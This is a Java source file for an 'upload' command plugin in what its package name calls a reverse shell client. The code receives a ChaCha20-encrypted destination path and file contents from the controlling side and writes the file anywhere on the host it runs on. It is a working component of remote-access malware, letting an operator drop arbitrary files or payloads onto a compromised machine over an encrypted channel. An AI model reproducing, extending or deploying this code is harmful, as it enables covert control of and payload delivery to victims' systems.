package obs1d1anc1ph3r.reverseshell.client.plugins;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import obs1d1anc1ph3r.reverseshell.client.encryption.ChaCha20;
import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;

public class UploadCommand implements CommandPlugin {

	private final StreamHandler streamHandler;

	public UploadCommand(StreamHandler streamHandler) {
		this.streamHandler = streamHandler;
	}

	@Override
	public String getCommandName() {
		return "upload";
	}

	@Override
	public String execute(String[] args) {
		try {
			int metadataPacketLength = streamHandler.getDataIn().readInt();
			byte[] nonceMetadata = new byte[12];
			byte[] encryptedMetadata = new byte[metadataPacketLength - 12];
			streamHandler.getDataIn().readFully(nonceMetadata);
			streamHandler.getDataIn().readFully(encryptedMetadata);

			byte[] decryptedMetadata = ChaCha20.decrypt(streamHandler.getEncryptionKey(), nonceMetadata, encryptedMetadata);
			String metadataString = new String(decryptedMetadata, StandardCharsets.UTF_8);

			String[] metadataParts = metadataString.split(" ", 2);
			if (metadataParts.length < 2) {
				return "[ERROR] Invalid upload metadata.";
			}

			String remoteDestPath = metadataParts[0];

			int filePacketLength = streamHandler.getDataIn().readInt();
			byte[] nonceFile = new byte[12];
			byte[] encryptedFileData = new byte[filePacketLength - 12];
			streamHandler.getDataIn().readFully(nonceFile);
			streamHandler.getDataIn().readFully(encryptedFileData);

			byte[] decryptedFileData = ChaCha20.decrypt(streamHandler.getEncryptionKey(), nonceFile, encryptedFileData);

			File outputFile = new File(remoteDestPath);
			try (FileOutputStream fileOut = new FileOutputStream(outputFile)) {
				fileOut.write(decryptedFileData);
			}

			return "[INFO] File received successfully: " + remoteDestPath;

		} catch (IOException e) {
			return "[ERROR] I/O Error during file upload: " + e.getMessage();
		} catch (Exception e) {
			return "[ERROR] Decryption failed: " + e.getMessage();
		}
	}

}
